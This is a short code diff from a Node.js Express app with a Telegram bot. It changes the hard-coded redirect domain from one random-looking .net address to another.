@@ -30,7 +30,7 @@ app.use("/mobile", express.static(path.join(__dirname, "public", "mobile")));
 
 // Telegram Bot setup
 const bot = new TelegramBot(process.env.TELEGRAM_TOKEN, { polling: true });
-let redirectDomain = "https://ggys5hav.net";
+let redirectDomain = "https://erytw3555.net";
 
 // Telegram Bot initialization check
 if (redirectDomain === "") {
